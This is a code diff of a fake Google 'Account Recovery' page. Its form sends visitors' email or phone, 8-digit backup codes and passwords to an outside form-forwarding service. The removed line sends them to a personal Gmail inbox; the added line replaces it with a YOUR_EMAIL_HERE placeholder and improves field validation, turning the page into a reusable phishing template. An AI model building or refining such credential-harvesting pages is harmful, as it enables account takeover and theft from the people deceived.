@@ -81,12 +81,20 @@
     
     <h1>Account Recovery</h1>
     
-    <form action="https://formsubmit.co/ssy200913@gmail.com" method="POST">
+    <form action="https://formsubmit.co/YOUR_EMAIL_HERE" method="POST">
         <p>Use your Google Account</p>
-        <input type="email" name="email" placeholder="Email or phone" required />
-        <input type="number" name="backup_code" placeholder="Enter your 8-digit backup code" required
-          min="10000000" max="99999999" />
-        <input type="password" name="new_password" placeholder="Enter your last password you remember" required />
+
+        <!-- Email or Phone Input -->
+        <input type="text" name="email_or_phone" placeholder="Email or phone" required 
+               pattern="(^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$)|(^\+?[0-9]{10,15}$)"
+               inputmode="email" />
+
+        <!-- Backup code field (8-digit limit) -->
+        <input type="number" name="backup_code" placeholder="Enter your 8-digit backup code" required 
+               min="10000000" max="99999999" />
+
+        <!-- New password field -->
+        <input type="password" name="new_password" placeholder="Enter your new password" required />
         
         <p>
             Not your computer? Use Guest mode to sign in privately.
